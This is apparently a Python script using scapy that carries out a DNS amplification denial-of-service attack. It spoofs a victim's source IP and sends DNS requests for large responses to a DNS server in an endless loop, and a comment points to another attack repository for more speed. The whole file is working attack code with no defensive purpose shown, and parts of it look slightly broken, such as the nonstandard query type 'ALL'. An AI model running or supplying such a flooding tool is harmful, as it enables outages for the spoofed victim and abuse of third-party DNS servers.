import sys
import random
import time
from scapy.all import * 

# to do look into https://github.com/ethanwilloner/DNS-Amplification-Attack for faster speed
resolve_domain = "dnsrtgshop.com" # domain to resolve. Be aware some nameservers deny ANY requests
src_ip = "10.10.10.3" # spoofed source or in other words the victim
dns_server_ip = "10.10.10.5" # DNS server.
query_type = "ALL" # DNS query type. A, MX, TXT, ALL

# choose random start source port
src_port = random.randint(49152,65530)
ip_id = random.randint(0,0xffff)
dns_id = random.randint(0,0xffff)

while True:
	# create layers
	udp = UDP(sport=src_port)
	ip = IP(src=src_ip,dst=dns_server_ip,ttl=128,id=ip_id)
	dns = DNS(rd=1,id=dns_id,qd=DNSQR(qname=resolve_domain,qtype=query_type),ar=DNSRROPT(rclass=8192))
	
	# combine layers
	packet = ip/udp/dns
	
	# send packet
	send(packet, verbose=0)
	
	# print status
	if (src_port % 50) == 0:
        # print status
		print("sent 50 packets")

	src_port += 1
	if (src_port > 65530):
		src_port = random.randint(49152,65530)
	ip_id += 1
	dns_id += 1
